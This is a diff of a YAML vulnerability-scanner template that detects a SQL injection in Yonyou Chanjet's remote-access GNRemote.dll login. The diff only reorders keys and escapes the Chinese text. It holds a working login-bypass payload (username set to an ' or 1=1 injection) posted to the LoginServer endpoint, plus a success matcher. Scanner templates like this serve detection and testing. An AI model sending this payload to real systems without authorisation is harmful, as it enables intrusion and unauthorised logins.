@@ -1,21 +1,23 @@
+expression: r0()
 id: yonyou-chanjet-gnremote-sql-inject
-
 info:
-  name: 用友 畅捷通远程通 GNRemote.dll SQL注入漏洞
   author: zan8in
-  severity: high
-  description: |
-    用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备
-    body="远程通CHANJET_Remote"
+  description: "\u7528\u53CB \u7545\u6377\u901A\u8FDC\u7A0B\u901A GNRemote.dll SQL\u6CE8\
+    \u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7SQL\u6CE8\u5165\u53EF\u4EE5\
+    \u83B7\u53D6\u670D\u52A1\u5668\u654F\u611F\u4FE1\u606F\u6216\u8005\u4F7F\u7528\
+    \u4E07\u80FD\u5BC6\u7801\u767B\u5F55\u8BBE\u5907\nbody=\"\u8FDC\u7A0B\u901ACHANJET_Remote\"\
+    \n"
+  name: "\u7528\u53CB \u7545\u6377\u901A\u8FDC\u7A0B\u901A GNRemote.dll SQL\u6CE8\u5165\
+    \u6F0F\u6D1E"
   reference:
-    - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%20GNRemote.dll%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
-
+  - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%20GNRemote.dll%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  severity: high
 rules:
   r0:
+    expression: response.status == 200 && '"RetCode":(\\s*?)0'.bmatches(response.body)
     request:
+      body: 'username=%22''%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+
+        '
       method: POST
       path: /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
-      body: |
-        username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
-    expression: response.status == 200 && '"RetCode":(\\s*?)0'.bmatches(response.body)
-expression: r0()
